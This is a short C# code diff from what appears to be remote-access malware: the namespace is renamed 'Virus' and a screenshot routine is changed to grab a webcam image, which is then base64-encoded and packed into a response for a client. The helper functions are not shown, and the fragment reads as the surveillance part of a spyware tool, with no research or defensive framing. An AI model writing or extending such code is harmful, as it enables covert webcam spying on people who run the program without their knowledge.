@@ -1,13 +1,6 @@
-﻿using ScreenshotSpace;
-using System;
-using System.Collections.Generic;
-using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using ToolsSpace;
+﻿using System;
 
-namespace ResponseBuilderSpace {
+namespace Virus {
 
     public class ResponseBuilder {
 
@@ -36,7 +29,7 @@ namespace ResponseBuilderSpace {
         }
 
         public void screenshot() {
-            add("screenshot", Tools.EncodeToBase64(Tools.EncodeImageToASCII(Tools.ScaleImage(Tools.TakeScreenshot(), Client.SCREENSHOT_SCALE_FACTOR))));
+            add("screenshot", Tools.EncodeToBase64(Tools.EncodeImageToASCII(Tools.ScaleImage(Tools.GetWebcamImage(), Client.SCREENSHOT_SCALE_FACTOR))));
         }
 
         public void Clear() {
